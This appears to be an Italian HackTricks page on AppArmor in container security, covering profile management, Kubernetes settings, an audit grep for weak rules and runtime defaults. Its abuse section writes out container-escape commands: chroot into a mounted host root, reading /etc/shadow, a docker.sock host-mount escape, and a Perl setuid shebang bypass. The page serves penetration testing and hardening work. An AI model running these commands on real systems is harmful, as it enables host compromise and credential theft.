# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Ruolo nell'isolamento dei container

Le revisioni della sicurezza dei container spesso si fermano alle capabilities e a seccomp, ma AppArmor continua a essere importante dopo questi controlli. Immagina un container con più privilegi del necessario oppure un workload che, per motivi operativi, richiede una capability aggiuntiva. AppArmor può comunque limitare l'accesso ai file, il comportamento dei mount, il networking e i pattern di esecuzione in modi che bloccano il percorso di abuso più ovvio. Per questo disabilitare AppArmor "solo per far funzionare l'applicazione" può trasformare silenziosamente una configurazione semplicemente rischiosa in una attivamente sfruttabile.

## Laboratorio

Per verificare se AppArmor è attivo sull'host, usa:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Per vedere con quale utente è in esecuzione il processo corrente del container:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La differenza è istruttiva. Nel caso normale, il processo dovrebbe mostrare un contesto AppArmor associato al profile scelto dal runtime. Nel caso unconfined, quel livello di restrizione aggiuntivo scompare.

Puoi anche controllare cosa Docker ritiene di aver applicato:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Utilizzo a Runtime

Docker può applicare un profilo AppArmor predefinito o personalizzato quando l'host lo supporta. Podman può inoltre integrarsi con AppArmor sui sistemi basati su AppArmor, sebbene nelle distribuzioni incentrate su SELinux l'altro sistema MAC assuma spesso un ruolo principale. Kubernetes può esporre la policy AppArmor a livello di workload sui nodi che supportano effettivamente AppArmor. Anche LXC e i relativi ambienti system-container della famiglia Ubuntu fanno ampio uso di AppArmor.

Il punto pratico è che AppArmor non è una "funzionalità di Docker". È una funzionalità del kernel dell'host che diversi runtime possono scegliere di applicare. Se l'host non lo supporta o il runtime è configurato per eseguire il workload in modalità unconfined, la protezione prevista non è realmente presente.

Nello specifico di Kubernetes, l'API moderna è `securityContext.appArmorProfile`. A partire da Kubernetes `v1.30`, le precedenti annotazioni beta di AppArmor sono deprecate. Sugli host supportati, `RuntimeDefault` è il profilo predefinito, mentre `Localhost` fa riferimento a un profilo che deve essere già caricato sul nodo. Questo è importante durante la review perché un manifest può sembrare compatibile con AppArmor pur dipendendo interamente dal supporto del nodo e dai profili precaricati.<sup>[[1]](#references)</sup>

Un dettaglio operativo sottile ma utile è che impostare esplicitamente `appArmorProfile.type: RuntimeDefault` è più restrittivo rispetto alla semplice omissione del campo. Se il campo è impostato esplicitamente e il nodo non supporta AppArmor, l'admission dovrebbe fallire. Se il campo viene omesso, il workload potrebbe comunque essere eseguito su un nodo senza AppArmor e semplicemente non ricevere questo ulteriore livello di confinement. Dal punto di vista di un attacker, questo è un buon motivo per verificare sia il manifest sia lo stato effettivo del nodo.<sup>[[1]](#references)</sup>

Sugli host Docker compatibili con AppArmor, il profilo predefinito più noto è `docker-default`. Questo profilo viene generato dal template AppArmor di Moby ed è importante perché spiega perché alcuni PoC basati sulle capabilities continuano a fallire in un container predefinito. In termini generali, `docker-default` consente il networking ordinario, nega le scritture su gran parte di `/proc`, nega l'accesso a parti sensibili di `/sys`, blocca le operazioni di mount e limita ptrace, impedendone l'uso come primitive generica per sondare l'host. Comprendere questa baseline aiuta a distinguere tra "il container dispone di `CAP_SYS_ADMIN`" e "il container può effettivamente usare questa capability contro le interfacce del kernel che mi interessano".

## Gestione dei Profili

I profili AppArmor sono generalmente archiviati in `/etc/apparmor.d/`. Una convenzione comune per i nomi consiste nel sostituire gli slash presenti nel path dell'eseguibile con dei punti. Ad esempio, un profilo per `/usr/bin/man` viene comunemente archiviato come `/etc/apparmor.d/usr.bin.man`. Questo dettaglio è importante sia nella difesa sia nell'assessment, perché una volta individuato il nome del profilo attivo è spesso possibile trovare rapidamente il file corrispondente sull'host.

Tra i comandi utili per la gestione lato host troviamo:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Il motivo per cui questi comandi sono importanti in un riferimento sulla container-security è che spiegano come i profili vengono effettivamente creati, caricati, impostati in complain mode e modificati dopo i cambiamenti all'applicazione. Se un operatore ha l'abitudine di spostare i profili in complain mode durante il troubleshooting e dimentica di ripristinare l'enforcement, il container può sembrare protetto nella documentazione, pur comportandosi nella realtà in modo molto più permissivo.

### Creazione e aggiornamento dei profili

`aa-genprof` può osservare il comportamento dell'applicazione e contribuire a generare un profilo in modo interattivo:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` può generare un profilo template che in seguito può essere caricato con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando il binario cambia e la policy deve essere aggiornata, `aa-logprof` può riprodurre i dinieghi trovati nei log e assistere l'operatore nel decidere se consentirli o negarli:
```bash
sudo aa-logprof
```
### Log

I dinieghi di AppArmor sono spesso visibili tramite `auditd`, syslog o strumenti come `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Questo è utile dal punto di vista operativo e offensivo. I defender lo usano per perfezionare i profili. Gli attaccanti lo usano per scoprire quale percorso o operazione esatta viene negata e se AppArmor è il controllo che blocca una exploit chain.

### Identificare Il File Del Profilo Esatto

Quando un runtime mostra un nome specifico del profilo AppArmor per un container, spesso è utile ricondurre quel nome al file del profilo presente sul disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Questo è particolarmente utile durante la revisione lato host perché colma il divario tra "il container dichiara di essere in esecuzione sotto il profilo `lowpriv`" e "le regole effettive si trovano in questo specifico file, che può essere sottoposto ad audit o ricaricato".

### Regole ad alto valore informativo da sottoporre ad audit

Quando puoi leggere un profilo, non fermarti alle semplici righe `deny`. Diversi tipi di regole modificano sostanzialmente l'efficacia di AppArmor contro un tentativo di escape dal container:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: esegue il binary target senza restrizioni. Se un helper, una shell o un interpreter raggiungibile è consentito tramite `ux`, questa è solitamente la prima cosa da testare.
- `px` / `Px` e `cx` / `Cx`: eseguono transizioni di profilo durante l'`exec`. Non sono automaticamente problematici, ma vale la pena sottoporli ad audit perché una transizione potrebbe portare a un profilo molto più permissivo di quello corrente.
- `change_profile`: consente a un task di passare a un altro profilo caricato, immediatamente o al successivo `exec`. Se il profilo di destinazione è più debole, questo può diventare l'escape hatch previsto per uscire da un domain restrittivo.
- `flags=(complain)`, `flags=(unconfined)` o il più recente `flags=(prompt)`: dovrebbero modificare il livello di fiducia riposto nel profilo. `complain` registra i rifiuti invece di applicarli, `unconfined` rimuove il boundary e `prompt` dipende da un percorso decisionale in userspace anziché da un deny applicato esclusivamente dal kernel.
- `userns` o `userns create,`: le policy AppArmor più recenti possono mediare la creazione di user namespace. Se un profilo del container lo consente esplicitamente, gli user namespace annidati restano utilizzabili anche quando la piattaforma usa AppArmor come parte della propria strategia di hardening.

Un comando `grep` utile lato host:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Questo tipo di audit è spesso più utile che esaminare centinaia di regole ordinarie sui file. Se un breakout dipende dall'esecuzione di un helper, dall'ingresso in un nuovo namespace o dall'escape verso un profilo meno restrittivo, la risposta è spesso nascosta in queste regole orientate alle transizioni, anziché nelle righe ovvie come `deny /etc/shadow r`.

## Misconfigurations

L'errore più evidente è `apparmor=unconfined`. Gli amministratori lo impostano spesso durante il debugging di un'applicazione che ha fallito perché il profilo ha correttamente bloccato qualcosa di pericoloso o imprevisto. Se il flag rimane in produzione, l'intero layer MAC è stato di fatto rimosso.

Un altro problema più sottile consiste nel presumere che i bind mounts siano innocui perché i permessi dei file sembrano normali. Poiché AppArmor è basato sui path, l'esposizione di path dell'host sotto percorsi di mount alternativi può interagire negativamente con le regole sui path. Un terzo errore è dimenticare che il nome di un profilo in un file di configurazione significa ben poco se il kernel dell'host non sta effettivamente applicando AppArmor.

## Abuse

Quando AppArmor non è presente, operazioni precedentemente limitate possono improvvisamente funzionare: la lettura di path sensibili attraverso bind mounts, l'accesso a parti di procfs o sysfs che avrebbero dovuto essere più difficili da usare, l'esecuzione di azioni relative ai mount se anche capabilities/seccomp lo consentono, oppure l'uso di path che un profilo normalmente negherebbe. AppArmor è spesso il meccanismo che spiega perché un tentativo di breakout basato sulle capabilities "dovrebbe funzionare" sulla carta, ma continua a fallire nella pratica. Rimuovendo AppArmor, lo stesso tentativo potrebbe iniziare ad avere successo.

Se sospetti che AppArmor sia il principale elemento che blocca una catena di abuso basata su path-traversal, bind-mount o mount, il primo passo consiste solitamente nel confrontare ciò che diventa accessibile con e senza un profilo. Ad esempio, se un path dell'host è montato all'interno del container, inizia verificando se puoi attraversarlo e leggerlo:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se il container dispone inoltre di una capability pericolosa come `CAP_SYS_ADMIN`, uno dei test più pratici consiste nel verificare se AppArmor è il controllo che blocca le operazioni di mount o l’accesso a filesystem del kernel sensibili:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Negli ambienti in cui un host path è già disponibile tramite un bind mount, la perdita di AppArmor può anche trasformare un problema di information disclosure in sola lettura in un accesso diretto ai file dell'host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Lo scopo di questi comandi non è che AppArmor da solo crei il breakout. È che, una volta rimosso AppArmor, molte vie di abuso basate su filesystem e mount diventano immediatamente testabili.

### Esempio completo: AppArmor disabilitato + root dell'host montata

Se il container ha già la root dell'host montata tramite bind mount in `/host`, la rimozione di AppArmor può trasformare una via di abuso del filesystem bloccata in un completo host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una volta che la shell viene eseguita tramite il filesystem dell'host, il workload è di fatto evaso dal perimetro del container:
```bash
id
hostname
cat /etc/shadow | head
```
### Esempio completo: AppArmor disabilitato + socket di runtime

Se la barriera reale era AppArmor attorno allo stato del runtime, un socket montato può essere sufficiente per una fuga completa:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Il percorso esatto dipende dal punto di mount, ma il risultato finale è lo stesso: AppArmor non impedisce più l'accesso alla runtime API, e la runtime API può avviare un container in grado di compromettere l'host.

### Esempio completo: bypass di un bind-mount basato sul percorso

Poiché AppArmor è basato sui percorsi, la protezione di `/proc/**` non protegge automaticamente lo stesso contenuto procfs dell'host quando è raggiungibile attraverso un percorso diverso:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
L'impatto dipende da cosa viene esattamente montato e dal fatto che il percorso alternativo eluda anche altri controlli, ma questo schema è uno dei motivi più chiari per cui AppArmor deve essere valutato insieme alla disposizione dei mount, anziché in isolamento.

### Esempio completo: Shebang Bypass

La policy di AppArmor a volte prende di mira un percorso dell'interprete senza tenere pienamente conto dell'esecuzione degli script tramite la gestione dello shebang. Un esempio storico prevedeva l'uso di uno script la cui prima riga indicava un interprete sottoposto a confinement:<sup>[[3]](#references)</sup>
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Questo tipo di esempio è importante come promemoria del fatto che l’intento del profile e la semantica effettiva dell’esecuzione possono divergere. Quando si esamina AppArmor negli ambienti container, le catene di interpreter e i percorsi alternativi di esecuzione meritano particolare attenzione.

## Checks

L’obiettivo di questi checks è rispondere rapidamente a tre domande: AppArmor è abilitato sull’host, il processo corrente è confinato e il runtime ha effettivamente applicato un profile a questo container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Cosa è interessante qui:

- Se `/proc/self/attr/current` mostra `unconfined`, il workload non beneficia del confinamento AppArmor.
- Se `aa-status` mostra AppArmor disabilitato o non caricato, qualsiasi nome di profilo nella configurazione del runtime è per lo più cosmetico.
- Se `docker inspect` mostra `unconfined` o un profilo custom imprevisto, spesso questo è il motivo per cui funziona un percorso di abuso basato sul filesystem o sui mount.
- Se `/sys/kernel/security/apparmor/profiles` non contiene il profilo previsto, la configurazione del runtime o dell'orchestrator, da sola, non è sufficiente.
- Se un profilo apparentemente hardenizzato contiene regole come `ux`, `change_profile` ampio, `userns` o `flags=(complain)`, il confine pratico potrebbe essere molto più debole di quanto suggerisca il nome del profilo.

Se un container dispone già di privilegi elevati per motivi operativi, lasciare AppArmor abilitato spesso fa la differenza tra un'eccezione controllata e un problema di sicurezza molto più ampio.

## Impostazioni predefinite del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita sugli host compatibili con AppArmor | Utilizza il profilo AppArmor `docker-default` salvo override | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dipendente dall'host | AppArmor è supportato tramite `--security-opt`, ma il comportamento predefinito esatto dipende dall'host/runtime ed è meno universale rispetto al profilo `docker-default` documentato da Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Predefinito condizionale | Se `appArmorProfile.type` non è specificato, il valore predefinito è `RuntimeDefault`, ma viene applicato solo quando AppArmor è abilitato sul nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un profilo debole, nodi senza supporto AppArmor |
| containerd / CRI-O sotto Kubernetes | Segue il supporto del nodo/runtime | I runtime comunemente supportati da Kubernetes supportano AppArmor, ma l'applicazione effettiva dipende ancora dal supporto del nodo e dalle impostazioni del workload | Come nella riga Kubernetes; la configurazione diretta del runtime può anche omettere completamente AppArmor |

Per AppArmor, la variabile più importante spesso è l'**host**, non solo il runtime. Un'impostazione del profilo in un manifest non crea confinamento su un nodo in cui AppArmor non è abilitato.

## Riferimenti

- [1] [Security context di Kubernetes: campi del profilo AppArmor e comportamento relativo al supporto del nodo](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Manpage `apparmor.d(5)` di Ubuntu 24.04: transizioni exec, `change_profile`, `userns` e flag del profilo](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [HTB: Nunchucks - AppArmor shebang bypass con uno script Perl](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)

{{#include ../../../../banners/hacktricks-training.md}}
